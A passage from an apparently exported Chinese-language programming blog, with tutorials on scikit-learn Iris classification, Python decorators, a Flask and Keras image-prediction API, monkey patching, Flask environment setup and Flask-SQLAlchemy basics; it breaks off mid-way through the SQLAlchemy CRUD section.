89   1
83   1
130  2
41   0
66   1
120  2
113  2
6    0
126  2
62   1
23   0
97   1
..  ..
10   0
76   1
129  2
144  2
137  2
12   0
79   1
123  2
127  2
36   0
74   1
37   0
131  2
110  2
22   0
32   0
147  2
134  2
102  2
75   1
88   1
148  2
33   0
56   1
28   0
90   1
82   1
25   0
121  2
13   0

[105 rows x 1 columns]
105

# 印出切分的 y_test 資料為所有資料集的 30%，共 45 筆print(y_test)print(len(y_test))
     0
102  2
53   1
143  2
70   1
61   1
67   1
24   0
124  2
36   0
92   1
114  2
31   0
120  2
87   1
74   1
47   0
69   1
56   1
93   1
16   0
144  2
133  2
29   0
57   1
116  2
50   1
86   1
44   0
3    0
21   0
82   1
99   1
134  2
111  2
135  2
4    0
2    0
91   1
85   1
122  2
127  2
11   0
27   0
79   1
51   1
45

訓練模型與校調 (Model Training)
上面是 scikit-learn 提供的演算法 cheat-sheet，當你面對琳琅滿目的模型一開始不知道要選擇什麼的話可以按圖索驥參考，另外這邊提供大圖支援連結。
這邊我們參考上圖來選擇適合模型：

樣本資料是否大於 50 筆：範例資料集總共有 150 筆資料，大於 50
是否為分類問題：Iris 花朵類別預測是多類別分類問題
是否有標籤好的資料：已經有 label 資料
樣本資料是否小於 100K：資料小於 100K
選擇 Linear SVC 模型（第一個選擇的模型）
是否是文字資料：不是
選擇 KNeighborsClassifier 模型（第二個選擇的模型）
後續優化 &#x2F; SVC &#x2F; Ensemble

# 初始化 LinearSVC 實例lin_clf = LinearSVC()# 使用 fit 來建置模型，其參數接收 training data matrix, testing data array，所以進行 y_train.values.ravel() Data Frame 轉換lin_clf.fit(X_train, y_train.values.ravel()) 
LinearSVC(C=1.0, class_weight=None, dual=True, fit_intercept=True,
     intercept_scaling=1, loss=&#39;squared_hinge&#39;, max_iter=1000,
     multi_class=&#39;ovr&#39;, penalty=&#39;l2&#39;, random_state=None, tol=0.0001,
     verbose=0)

# 初始化 KNeighborsClassifier 實例knn = KNeighborsClassifier()# 使用 fit 來建置模型，其參數接收 training data matrix, testing data array，所以進行 y_train.values.ravel() 轉換knn.fit(X_train, y_train.values.ravel())

KNeighborsClassifier(algorithm=&#39;auto&#39;, leaf_size=30, metric=&#39;minkowski&#39;,
           metric_params=None, n_jobs=1, n_neighbors=5, p=2,
           weights=&#39;uniform&#39;)

模型驗證 (Model Predict &amp; Testing)
監督式學習的分類問題通常會分為訓練模型和驗證模型，這邊我們使用 predict 去產生對應的目標值，此時和正確答案（已經標籤好的目標值）比較可以知道模型預測的正確率。我們可以看到 KNeighborsClassifier 在正確率（accuracy）表現上相對比較好一點（0.98 比 0.93）。
# 使用 X_test 來預測結果print(lin_clf.predict(X_test))

[1 1 0 2 1 2 0 1 1 2 2 1 0 2 0 0 2 1 2 0 0 1 2 0 2 1 2 0 0 0 1 0 2 1 1 0 0
 0 1 0 1 2 2 1 1]

# 印出預測準確率print(lin_clf.score(X_test, y_test))

0.933333333333

# 使用 X_test 來預測結果print(knn.predict(X_test))

[1 1 0 1 1 2 0 1 1 2 2 1 0 2 0 0 2 1 2 0 0 1 2 0 2 1 2 0 0 0 1 0 1 1 1 0 0
 0 1 0 1 2 2 1 1]

# 印出 testing data 預測標籤機率print(knn.predict_proba(X_test))

[[ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.8  0.2]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 0.   0.2  0.8]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.6  0.4]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]]

# 印出預測準確率print(knn.score(X_test, y_test))
0.977777777778

模型優化 (Model Optimization)由於本文是簡易範例，這邊就沒有示範如何進行模型優化（這邊可以嘗試使用 SVC 和 Ensemble 方法）。不過一般來說在分類模型優化上，讓模型預測表現的更好的方法大約有幾種：

特徵工程：選擇更適合特徵值或是更好的資料清理，某種程度上很需要專業知識的協助（domain konwledge）去發現和整合出更好的 feature
調整模型參數：調整模型的參數
模型融合：結合幾個弱分類器結果來變成強的分類器

上線運行 (Deploy Model)當模型優化完畢就可以進行上線運行，其中 Python 比 R 更具優勢的地方，那就是 Python 很容易跟現有的系統進行整合，Python 也有許多好用的 Web 框架可以使用，也因為 Python 是膠水語言，若要進行效能優化也可以很容易呼叫 C&#x2F;C++ 進行操作，提昇執行效能。
總結以上用一個簡單的範例介紹了 Python 機器學習套件 Scikit Learn 的基本功能和機器學習整個基本 Workflow。由於是基礎範例所以省略一些比較繁瑣的資料處理部分，事實上，真實世界資料大多是非結構化資料的髒資料，而資料分析的過程往往需要花上許多時間進行資料預處理和資料清理上。接下來我們將介紹其他 Python 資料科學和機器學習生態系和相關工具。
延伸閱讀
机器学习实战 之 kNN 分类
Machine Learning Workflow
Kaggle机器学习之模型融合（stacking）心得
Python 資料視覺化
Train &amp; Predict workflow
Sample Classification Pipeline workflow
【机器学习】模型融合方法概述

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover. Interested in Internet, AI and Blockchain.:)
（image via medium、mapr、silvrback、camo、scipy、mirlab、concreteinteractive、sndimg）
]]></content>
      <tags>
        <tag>Python, Machine Learning, 機器學習, AI, Artificial Intelligence, NLP, Data Mining, 人工智慧, 監督式學習, Supervised learning, 從零開始學資料科學, Numpy, 資料科學, data science, data scientist, pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Decorator 入門教學</title>
    <url>/2018/06/15/python-decorator-introduction/</url>
    <content><![CDATA[
前言Python 是近來十分火紅的程式語言，不管是網站開發、遊戲開發或是資料科學都可以看見 Python 的身影，本系列文章將透過複習 Python 小 tips，讓讀者可以重新認識 Python。這次我們先來認識一下 Decorator 這個看似怪異但卻常被使用的設計模式。
什麼是 Decorator簡單來說 Decorator 程式語言的設計模式，也是一種特殊的 function（例如：把 function 當做參數傳入，再把 function 傳回），透過 Decorator 可以將加上 Decorator 的 function 加上更多能力，重用許多程式碼。而在 Python 中我們則是使用 @ 當做 Decorator 使用的語法糖符號。
製作第一個 Python Decorator透過一個簡單抽象化例子，我們可以一窺 Python Decorator 的樣貌：
@my_decoratordef my_func(stuff):    do_things()

我們可以看到 @my_decorator 這個 Decorator 語法糖被加在 my_func 之上。而上面的程式碼其實等於，將 my_func 當做參數傳入 my_decorator 中：
def my_func(stuff):    do_things()my_func = my_decorator(my_func)

看起來 Decorator 好像蠻方便的。但讀者內心一定會開始思考究竟 Decorator 常用嗎？或是會有了使用在哪些地方？等問題。事實上在實務上，Python 應用程式有許多地方都可以看到 Decorator 使用的蹤影，舉凡登入驗證、日誌 logging 等地方。
下面是一個簡單範例，主要是讓每次使用者在瀏覽 payment 頁面時流量要檢查使用者是否有登入進行頁面權限管理，若沒有則回傳 403 沒有權限訪問，若有則繼續往後送去 render 出頁面。由於很適合使用 Decorator 來撰寫的情境，所以可以建立一個 Decorator 來當做每次是否呈現頁面的權限管理機制。
from flask import abort# wraps 是一個製作 Decorator 好工具，也可以把參數傳入from functools import wrapsdef check_login():    # 做一些檢查def login_required(fun):    &quot;&quot;&quot;    Required user to login    &quot;&quot;&quot;    @wraps(fun)    # wraps 可協助傳入參數做操作    def wrapper(*args, **kwds):        if check_login() is None:            return abort(403)        return fun(*args, **kwds)    return wrapper

Python Flask Web 應用程式的 routing（payment 頁面加上了 @login_required），代表有驗證登入的使用者才能看到該頁面：
@payment_blueprint.route(&#x27;/payment&#x27;)@login_requireddef get_payment_page():    return render_template(&#x27;payment/index.html&#x27;)

總結以上就是 Python Decorator 簡單用法介紹，事實上關於 Python Decorator 還有許多進階應用可以去發掘，而中文的裝飾器翻譯又常常會讓人有所誤解，需要自己動手實作才能比較理解相關概念。本系列文章接下來也將透過複習 Python 小 tips，讓讀者可以重新認識 Python。
延伸閱讀
理解 Python 装饰器看这一篇就够了
Advanced Uses of Python Decorators

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
（image via kleiber）
]]></content>
      <tags>
        <tag>Python Decorator 裝飾器</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Flask + Keras 建置圖片分類 API</title>
    <url>/2018/11/01/python-flask-keras-image-predict-api/</url>
    <content><![CDATA[
前言深度學習是近年來電腦科學界火熱的話題，如何將深度學習模型整合到生活應用更是許多開發者想要嘗試的事情，本文透過 Python Flask 搭配 Keras 這個深度學習函式庫（backend 搭配 tensorflow），建立一個簡易版的預測圖片分類的 web api。那就讓我們開始吧。
專案初始化首先我們先打開終端機，初始化我們的專案：
$ mkdir python-keras-image-predict-api$ cd mkdir python-keras-image-predict-api$ virtualenv venv$ . venv/bin/activate$ pip install keras tensorflow flask pillow

然後新增一個 main.py 檔案，建立一個簡單 flask api 雛形，一個 POST predict 圖片 api：
from flask import Flask, request, jsonify@app.route(&#x27;/predict&#x27;, methods=[&#x27;POST&#x27;])def predict():    # initialize the data dictionary that will be returned from the    # view    data = &#123;&#x27;success&#x27;: False&#125;    return jsonify(data)# 當啟動 server 時先去預先 load model 每次 request 都要重新 load 造成效率低下且資源浪費if __name__ == &#x27;__main__&#x27;:     app.run()

資料前處理一般而言建立一個機器學習模型會有基本的幾個步驟：

資料前處理
訓練模型
預測模型

首先我們先來建立資料前處理函式，在預測圖片前我們需要進行前處理，將輸入圖片轉為模型可以接受的格式：
def preprocess_image(image, target):    # 將圖片轉為 RGB 模式方便 predict    if image.mode != &#x27;RGB&#x27;:        image = image.convert(&#x27;RGB&#x27;)    # 將資料進行前處理轉成 model 可以使用的 input    image = image.resize(target)    image = img_to_array(image)    image = np.expand_dims(image, axis=0)    image = imagenet_utils.preprocess_input(image)    return image

建立模型緊接著我們來建立模型，這邊為了簡化過程，我們使用 keras 內建的 ResNet50 pre-trained 模型
def load_model():    # load pre-trained 好的 Keras model，這邊使用 ResNet50 和 ImageNet 資料集（你也可以使用自己的 model）    global model    global graph    model = ResNet50(weights=&#x27;imagenet&#x27;)    # 初始化 tensorflow graph    graph = tf.get_default_graph()

整合成 API最後我們把我們的資料前處理和模型來整合進入我們的 API：
完整程式碼（main.py）：
import io# import the necessary packagesfrom keras.applications import ResNet50from keras.preprocessing.image import img_to_arrayfrom keras.applications import imagenet_utilsfrom PIL import Imageimport numpy as npfrom flask import Flask, request, jsonifyimport tensorflow as tf# initialize our Flask application and the Keras modelapp = Flask(__name__)model = Nonedef load_model():    # load pre-trained 好的 Keras model，這邊使用 ResNet50 和 ImageNet 資料集（你也可以使用自己的 model）    global model    global graph    model = ResNet50(weights=&#x27;imagenet&#x27;)    # 初始化 tensorflow graph    graph = tf.get_default_graph()def preprocess_image(image, target):    # 將圖片轉為 RGB 模式方便 predict    if image.mode != &#x27;RGB&#x27;:        image = image.convert(&#x27;RGB&#x27;)    # 將資料進行前處理轉成 model 可以使用的 input    image = image.resize(target)    image = img_to_array(image)    image = np.expand_dims(image, axis=0)    image = imagenet_utils.preprocess_input(image)    return image@app.route(&#x27;/predict&#x27;, methods=[&#x27;POST&#x27;])def predict():    # initialize the data dictionary that will be returned from the    # view    data = &#123;&#x27;success&#x27;: False&#125;    print(&#x27;request&#x27;)    # ensure an image was properly uploaded to our endpoint    if request.method == &#x27;POST&#x27;:        if request.files.get(&#x27;image&#x27;):            # 從 flask request 中讀取圖片（byte str）            image = request.files[&#x27;image&#x27;].read()            # 將圖片轉成 PIL 可以使用的格式            image = Image.open(io.BytesIO(image))            # 進行圖片前處理方便預測模型使用            image = preprocess_image(image, target=(224, 224))            # 原本初始化的 tensorflow graph 搭配 sesstion context，預測結果            with graph.as_default():                preds = model.predict(image)                results = imagenet_utils.decode_predictions(preds)                        data[&#x27;predictions&#x27;] = []            # 將預測結果整理後回傳 json 檔案（分類和可能機率）            for (_, label, prob) in results[0]:                r = &#123;&#x27;label&#x27;: label, &#x27;probability&#x27;: float(prob)&#125;                data[&#x27;predictions&#x27;].append(r)            data[&#x27;success&#x27;] = True    return jsonify(data)# 當啟動 server 時先去預先 load model 每次 request 都要重新 load 造成效率低下且資源浪費。記得等到 model 和 server 完整執行後再發 requestif __name__ == &#x27;__main__&#x27;:    print((&#x27;* Loading Keras model and Flask starting server...&#x27;        &#x27;please wait until server has fully started&#x27;))    load_model()    app.run()

預測終於來到了預測的階段，我們這邊使用一下可愛的狗狗圖片：

啟動 server 執行 Flask 測試
$ python main.py

打開另外一個終端機視窗：
curl -X POST -F image=@dog_1.jpg http://127.0.0.1:5000/predict

回傳結果，是 English_foxhound 英國獵狐犬！
&#123;    &quot;predictions&quot;: [        &#123;&quot;label&quot;:&quot;English_foxhound&quot;,&quot;probability&quot;:0.8246265649795532&#125;,        &#123;&quot;label&quot;:&quot;Saint_Bernard&quot;,&quot;probability&quot;:0.05787363648414612&#125;,        &#123;&quot;label&quot;:&quot;Walker_hound&quot;,&quot;probability&quot;:0.05374307930469513&#125;,        &#123;&quot;label&quot;:&quot;beagle&quot;,&quot;probability&quot;:0.029194286093115807&#125;,        &#123;&quot;label&quot;:&quot;Greater_Swiss_Mountain_dog&quot;,&quot;probability&quot;:0.009891272522509098&#125;    ],    &quot;success&quot;:true&#125;

總結以上透過 Python Flask 搭配 Keras 這個深度學習函式庫（backend 搭配 tensorflow），我們建立一個簡易版的預測圖片分類的 web api，成功預測了狗狗圖片，是一隻英國獵狐犬！深度學習是目前進展非常快速的領域，歡迎讀者一起討論交流，我們下次見囉！
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
（image via semaphoreci）
]]></content>
      <tags>
        <tag>Python, Keras</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Monkey Patch 入門教學</title>
    <url>/2018/07/14/python-monkey-patch/</url>
    <content><![CDATA[
前言Python 是近來十分火紅的程式語言，不管是網站開發、遊戲開發或是資料科學都可以看見 Python 的身影，本系列文章將透過複習 Python 小 tips，讓讀者可以重新認識 Python。這次我們先來認識一下 Monkey Patch 這個程式設計上的小技巧。
什麼是 Monkey Patch簡單來說，Monkey Patch 就是在 run time 時動態更改 class 或是 module 已經定義好的函數或是屬性內容。實務上常見的使用在 test 上用來 mock 行為或是 gevent 函式庫等。
A MonkeyPatch is a piece of Python code which extends or modifies other code at runtime (typically at startup).

製作第一個 Python Monkey Patch我們這邊開了一個簡單的 monkey.py 檔案，裡面放置 demo 用的 class：MyClass，裡面有個 method 叫 f，會列印出 f() 字串，
# monkey.pyclass MyClass:    def f(self):        print &#x27;f()&#x27;

此時我們在另外一個 main.py 檔案引入 monkey module，並替換掉 f function 為 monkey_f，這樣定義的出來的 instance 呼叫方法 f() 印出的則為 monkey_f()
# main.pyimport monkeydef monkey_f(self):    print &#x27;monkey_f()&#x27; monkey.MyClass.f = monkey_fobj = monkey.MyClass()obj.f()# monkey_f()

總結以上就是 Python Monkey Patch 簡單介紹，Python Monkey Patch 主要用於動態於 run time 改變 class 的屬性或是方法，實務上常見的使用在 test 上用來 mock 行為或是 gevent 函式庫等地方。
延伸閱讀
源码分析之gevent monkey.patch_all实现原理
What is monkey patching?
Monkey-patching in Python: a magic trick or a powerful tool?

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
（image via semaphoreci）
]]></content>
      <tags>
        <tag>Python 猴子補丁 Monkey Patch</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web Flask 實戰開發教學 - 簡介與環境建置</title>
    <url>/2017/06/03/python-web-flask101-tutorial-introduction-and-environment-setup/</url>
    <content><![CDATA[ 
前言Web 開發涉及層面很廣，包含了前後端開發、資料庫優化、平行處理、負載平衡、高可用性、資訊安全、雲端伺服器部屬等議題，本系列文章將透過介紹 Python Web Flask 實戰開發來學習現代化網站開發的方方面面。一開始先從簡介和環境建置開始吧！
什麼是 Python？Python 是一種物件導向、直譯式的跨平台電腦程式語言，它包含了一組功能完備的標準庫和豐富套件生態系，可以輕鬆完成很多常見的任務（例如：讀寫檔案、自然語言處理、網路爬蟲、網站開發、機器學習等），因為它可以很輕易整合其他底層語言（例如：C&#x2F;C++ 等），所以又稱為膠水語言。它的語法簡單，與其它大多數程式設計語言使用大括弧不一樣，它使用空白縮進來定義語句塊。由於具備簡潔易學等特性，許多開發者推薦 Python 為初學者第一個學習的程式語言。由於版本更迭，我們接下來討論的主要是以 Python3 為主，若電腦沒有安裝的話，你可以在官方網站下載，若你不是安裝 Anaconda 這個 all-in-one 版本的話（自帶許多套件和科學運算工具，也可以建立虛擬開發環境），記得要安裝 pip、IPython。 
接下來我們將以 Anaconda 這個開發環境為主要講解環境。由於我們假定讀者已經有一些 Python 基礎，所以我們會跳過有關 Python 語法的基本教學。
什麼是 Flask？ 
Flask 是一個使用 Python 撰寫的輕量級 Web 應用程式框架，由於其輕量特性，也稱為 micro-framework（微框架）。Flask 核心十分簡單，主要是由 Werkzeug WSGI 工具箱和 Jinja2 模板引擎所組成，Flask 和 Django 不同的地方在於 Flask 給予開發者非常大的彈性（當然你也可以說是需要思考更多事情），可以選用不同的用的 extension 來增加其功能。相比之下，Django 雖然完善但技術選擇相對不彈性，不論是 ORM、表單驗證或是模版引擎都有自己的作法。事實上沒有最好的框架，只有合適的使用情境，Django 相比之下適合需要快速的開發大型的應用程式，和 Ruby 中的 Ruby on Rails 相似，而 Flask 則是相對輕量彈性，更像是 Ruby 界的 Sinatra。若讀者想先體驗看看 Flask 的程式狀況，以下是 Flask 簡易運行的程式，啟動測試伺服器後，可以在瀏覽器中（http://localhost:5000/）印出 Hello World!。
index.pyfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello():    return &quot;Hello World!&quot;if __name__ == &quot;__main__&quot;:    app.run()

Python Web 開發環境建置所謂工欲善其事，必先利其器，要開發好的應用程式必須先準備好開發環境才行。以下介紹我們在接下來開發 Python Flask Web 應用程式所需要安裝的開發環境工具（以下以 Mac OS 等 Unix-like 作業系統為示範，若是 Windows 使用者建議安裝 Virtualbox 並運行 Linux Ubuntu 作業系統，參考安裝文件）：

Microsoft VSCode 編輯器 Microsoft VSCode 是 Microsoft 推出的編輯器（非整合開發環境 IDE），夾帶著 Microsoft 過去打造 Visual studio 整合開發環境的豐富經驗，相比 Sublime Text 和其他編輯器，VSCode 的優勢在於開源且活躍的開發社群、內建 debugger 框架、原生 Git 整合、套件整合容易等特性。所以對於初學者來說 VSCode 是一個蠻適合入門的開發環境。它的安裝方式也十分簡易，在官網下載後按照指示安裝完成即可。
  
 我們可以安裝 Python 語法和格式檢查的相關 Python 套件幫助除錯：
  

終端機環境（iTterm&#x2F;內建 terminal） terminal（終端機）是我們下指令的地方，許多時候我們進行程式開發時不會使用 GUI 的介面而是使用下指令方式請電腦做相對應的行為。在 Linux 和 Mac 裡面都有內建的 terminal 的應用程式，若你是 Mac 用戶想使用更便利的工具（分割視窗、熱鍵、搜尋、自動補完等）可以額外安裝 iterm2 做使用。
  
 下指令（$ 為提示字元，不用輸入）：
  
 對於有志於從事程式開發相關工作的讀者建議可以多熟悉指令碼的輸入，更多指令碼可以參考鳥哥撰寫的 Linux 基本指令介紹 和 Linux 學習資源。

Git 版本控制系統&#x2F;註冊 GitHub 帳戶 Git 是一種分散式版本控制系統，可以讓我們可以更方便地管理我們的程式碼。在網路上有非常多優秀的 Git 教學文件（連猴子都能懂的Git入門指南、寫給大家的 Git 教學、初心者 Git 上手攻略）。安裝 Git 方式是到官網下載軟體，依照指示安裝。
  
 互動式語法學習：
  
 在介紹完 git 之後我們來了解一下 GitHub。GitHub 是一個可以存放 git 程式碼專案的平台，透過 GitHub 我們可以接觸到最新的開放原始碼資訊，也可以將我們的程式碼開源出來。
  
 從 GitHub 上複製程式碼
  
 # 複製一份到本地端$ git clone https://github.com/kdchang/flask101.git# 移動到資料夾$ cd flask101

 常見 Git 指令：
 # 初始化專案$ git init# 查看狀態$ git status# 檢查差異$ git diff # 將變更檔案放入暫存區$ git add index.py# 使用 commit -m 提交變更$ git -a -m &#x27;init commit&#x27;# 查看歷史$ git log# 放棄已經 commit 的檔案重回暫存區$ git reset HEAD index.py# 放棄檔案變更$ git checkout index.py

Anaconda Python3 版本 Anaconda 是一個 all-in-one 的 Python 開發環境，對於初學者來說是個十分合適的開發環境包。Anaconda 具備了幾項特點：

便於安裝許多流行的科學、數學、工程、數據分析的 Python 模組  
開源和免費
跨平台支持：Linux、Windows、Mac
支持 Python 版本切換，方便建立不同的虛擬開發環境
內建 Spyder 編輯器和 Jupyter Notebook 環境

 安裝流程也十分簡單，進入 Anaconda 首頁，選擇對應作業系統（這邊使用 Mac OS）： 
 選擇對應 Python 版本下載，我們使用 Graphical Installer（圖像介面安裝方式），接著在下載完成時按照預設的安裝方式完成安裝；  
 若是完整安裝成功，可以打開終端機輸入，若是顯示 Python 3.6.0 :: Anaconda 4.3.0 (x86_64) 版本號即安裝成功：
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 接著要建立我們專案虛擬環境，這樣在安裝操作套件時比較不容易被污染到 root 的環境，啟動後會出現（套件名稱）的提示字元：
 # 顯示目前虛擬環境列表$ conda info -e # 創建虛擬環境$ conda create -n 套件名稱 python=3.6# 進入虛擬環境（若是 Windows cmder 環境不用加 source） ，成功後提示字元變成：（套件名稱）$$ source activate 套件名稱# 離開虛擬環境（若是 Windows cmder 環境不用加 source） $ source deactivate 

建立第一個 Flask 開發專案使用 pip 管理 Python 模組# 安裝模組$ pip install 模組名# 移除模組$ pip uninstall 模組名# 搜尋模組$ pip search 模組名

通常開發專案時我們會將已安裝模組名稱和版本號存成一個列表，以便下次安裝使用：
$ pip freeze &gt; requirements.txt

根據 requirements.txt 列表安裝模組：
$ pip install -r requirements.txt

建立虛擬環境在了解 pip 套件管理工具後我們正式來建立一個 Flask 的專案：
建立專案資料夾
$ mkdir python-flask-todo-app$ cd python-flask-todo-app

建立獨立虛擬環境
$ conda create -n python-flask-todo-app python=3.6$ source activate python-flask-todo-app

安裝 Flask 模組
$ pip install flask

設定 Config 設定檔案建立設定檔 config.py 檔案在專案資料夾的根目錄中：
class Config(object):    passclass ProdConfig(Config):    passclass DevConfig(Config):    DEBUG = True

建立一個 main.py 檔案初始化 Flask App 和使用其 API，若是一切正常在終端機執行 python main.py 會在瀏覽器網址列輸入 localhost:5000 後看到 Hello World 了！
main.pyfrom flask import Flaskfrom config import DevConfig# 初始化 Flask 類別成為 instanceapp = Flask(__name__)app.config.from_object(DevConfig)# 路由和處理函式配對@app.route(&#x27;/&#x27;)def index():    return &#x27;Hello World!&#x27;# 判斷自己執行非被當做引入的模組，因為 __name__ 這變數若被當做模組引入使用就不會是 __main__if __name__ == &#x27;__main__&#x27;:    app.run()

使用 Flask ScriptFlask Script 是 Flask 常用的 extensions，可以讓我們使用指令列來操作 Flask 程式並在 shell 環境下操作 app context，使用方式如下：
安裝模組
$ pip install flask-script

建立 manage.py 於根目錄
manage.pyfrom flask_script import Manager, Serverfrom main import app# 設定你的 appmanager = Manager(app)# 設定 python manage.py runserver 為啟動 server 指令manager.add_command(&#x27;runserver&#x27;, Server())# 設定 python manage.py shell 為啟動互動式指令 shell 的指令 @manager.shelldef make_shell_context():    return dict(app=app)if __name__ == &#x27;__main__&#x27;:    manager.run()

當執行 $ python manage.py runserver 即會執行測試伺服器，$ python manage.py shell 可以在對話指令列中中輸入 app 找到被引入的 &lt;Flask &#39;main&#39;&gt;，可以讓我們在互動式指令對話框中測試操作使用。
總結本文介紹了如何建置 Python Web 開發環境，我們也實際完成了我們第一個 Python Flask 程式。在接下來章節中我們將持續介紹 Python Web Flask 實戰開發，並學習現代化網站開發的方方面面。
延伸閱讀
Wiki Flask (web framework)
Python Web 程式設計入門實戰線上課程

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
（image via fedoramagazine）
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, 教學, Flask, 框架, 網站開發, Anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web Flask 實戰開發教學 - SQLAlchemy 與 ORM</title>
    <url>/2017/08/12/python-web-flask101-tutorial-sqlalchemy-orm-database-models/</url>
    <content><![CDATA[ 
前言Web 開發涉及層面很廣，包含了前後端開發、資料庫優化、平行處理、負載平衡、高可用性、資訊安全、雲端伺服器部屬等議題，本系列文章將透過介紹 Python Web Flask 實戰開發來學習現代化網站開發的方方面面。上一篇我們完成了環境建置，這一單元我們將進入 MVC 架構的 Models 部分並學習如何使用 SQLAlchemy 建立和資料庫互動的 ORM 機制。
 
什麼是 MVC？MVC 模式（Model–view–controller）是軟體工程中的一種軟體架構模式，把軟體系統分為三個基本部分：模型（Model）、視圖（View）和控制器（Controller）。

控制器（Controller）- 對 Request&#x2F;Response 進行處理並透過 Controller 把 Model 的資料串接到 View（Templates）。 
視圖（View） - 直接面對使用者的使用者介面設計。
模型（Model） - 負責和資料庫互動，儲存資料。

使用 MVC 的好處在於可以用更高階的角度去思考整個程式架構提高程式可重用性和降低程式耦合性。 事實上 Django、Rails 和 ASP.NET MVC 等較成熟的 Web 框架也是參考 MVC 的架構去設計。
什麼是關聯式資料庫（RDB）？Database 資料庫一個資料儲存的集合，方便我們去讀取新增刪除修改，而 Relational Database（關聯式資料庫）廣泛應用資料庫應用程式中，它把資料儲存在行列表格中，有可能不同資料表的內容會彼此依賴關聯。常見的關聯式資料庫，例如：MySQL、Postgres、Oracle、MSSSQL、SQLite，本文我們將使用 SQLite 這個輕量級的關聯式資料庫來當做範例教學。
什麼是 ORM？ORM 指的是 Object Relational Mapping（物件關聯對應），是一種程式設計技術，用於實現物件導向程式語言裡不同類型系統的資料之間的轉換。一般而言物件導向是從軟體工程基本原則（例如：耦合、聚合、封裝）的基礎上發展起來的，然而關聯式資料庫則是從數學理論發展而來的，兩套理論存在顯著的區別。為了解決這個不符合的現象，物件關聯對映技術搬演著中介層的角色，讓開發可以使用物件方式來操作資料庫，而不用使用 SQL 語法，當然若是要使用複雜的操作，仍需要使用到 SQL 語法。
更多 SQL 語法學習：SQL語法教學- 1Keydata
 
Flask SQLAlchemy 使用設定SQLAlchemy 是 Python 社群最廣泛使用的 ORM 套件。為了方便使用 ORM 來操作資料庫，我們使用 SQLAlchemy 的封裝 Flask SQLAlchemy 來進行 Models 的建立（當然你也可以單獨使用 SQLAlchemy）。以下是 SQLAlchemy 使用的簡單範例：
main.pyfrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)# 設定資料庫位置，並建立 appapp.config[&#x27;SQLALCHEMY_DATABASE_URI&#x27;] = &#x27;sqlite:////tmp/test.db&#x27;db = SQLAlchemy(app)

models.py# 建立資料表欄位from main import dbclass Todo(db.Model):    # __table__name = &#x27;user_table&#x27;，若不寫則看 class name    # 設定 primary_key    id = db.Column(db.Integer, primary_key=True)    content = db.Column(db.String(80))    def __init__(self, content):        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.content

manage.pyfrom flask_script import Manager, Serverfrom main import appfrom models import Todo# 設定你的 appmanager = Manager(app)# 設定 python manage.py runserver 為啟動 server 指令manager.add_command(&#x27;runserver&#x27;, Server())# 設定 python manage.py shell 為啟動互動式指令 shell 的指令 @manager.shelldef make_shell_context():    return dict(app=app, Todo=Todo)if __name__ == &#x27;__main__&#x27;:    manager.run()

操作指令：
$ python manage.py shell&gt;&gt;&gt; db.create_all()

CRUD 操作設計CRUD 是一般網路應用程式最常見的資料庫操作（create, read, update, delete），接著我們要使用 session 來操作我們的 CRUD 功能，首先先在終端機中輸入 $ python manage.py shell 後進行資料庫指令模擬操作（要注意的是 Flask SQLAlchemy 針對每個 request 會創建一個新的 session，若沒有 commit 的操作即被丟棄）：

新增（Create） 新增一筆資料後將它加到 db.session 中，完成 commit：
 &gt;&gt;&gt; todo = Todo(content=&#x27;hacking&#x27;)&gt;&gt;&gt; db.session.add(todo)&gt;&gt;&gt; db.session.commit()

讀取（Read）Model.query 是 db.session.query(Model) 的簡寫，所以我們可以使用以下方式讀取資料庫資料：
